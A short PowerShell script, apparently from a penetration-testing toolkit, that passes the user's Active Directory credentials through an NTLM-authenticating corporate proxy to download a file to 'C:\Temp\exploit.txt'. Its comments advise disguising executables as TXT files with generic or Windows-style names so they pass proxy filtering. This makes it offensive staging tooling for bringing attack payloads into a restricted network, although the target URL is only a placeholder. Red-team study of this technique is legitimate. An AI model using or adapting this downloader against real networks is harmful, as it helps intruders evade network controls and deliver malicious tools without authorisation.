#Powershell

#==========================
#= Written by lutzenfried =
#==========================
#Use for educational purpose only

#Description : PowerShell downloader with NTLM proxy authentication

#Prerequisite : AD credentials
#Proxy and URL configuration
$WebProxy = New-Object System.Net.WebProxy("http://proxyServer:port", $true)
$Url = "%URL_FILE_TO_DOWNLOAD%"

#Load TXT file instead of exe file, with generic names or windows style name
$WebClient = New-Object net.webclient

#Creation of a new object for web request
$WebClient.Proxy = $WebProxy
$Username = $env:username
$Password = Read-Host 'What is your password?' -AsSecureString #Or using password directly in clear text within the powershell script but...

#Asking for user password and typed it in secure manner
$WebClient.Proxy.Credentials = New-Object System.Net.NetworkCredential($USERNAME, $Password)

#Configuration of new object WebClient for proxy authentication
$path = "C:\Temp\exploit.txt"

#Path configuration and output file
$WebClient.DownloadFile($Url, $path)

echo "`r`n======== The file has been download successfully ========"

#Final web request for downloading file
